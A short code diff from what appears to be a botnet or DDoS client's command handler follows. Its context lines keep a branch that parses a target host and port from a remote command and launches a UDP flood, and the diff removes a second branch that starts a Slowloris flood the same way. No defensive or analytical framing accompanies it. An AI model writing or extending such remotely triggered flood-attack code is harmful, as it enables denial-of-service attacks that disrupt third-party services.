@@ -22,12 +22,6 @@ def handle_commands(command):
             target  = addr[0]
             port    = addr[1]
             udp.flood(target,port)
-        elif "!loris.start" in command:
-            options = command.split(' ')
-            addr = options[1].split(':')
-            target  = addr[0]
-            port    = addr[1]
-            slowloris.flood(target,port)    
         else:
             pass
     except:
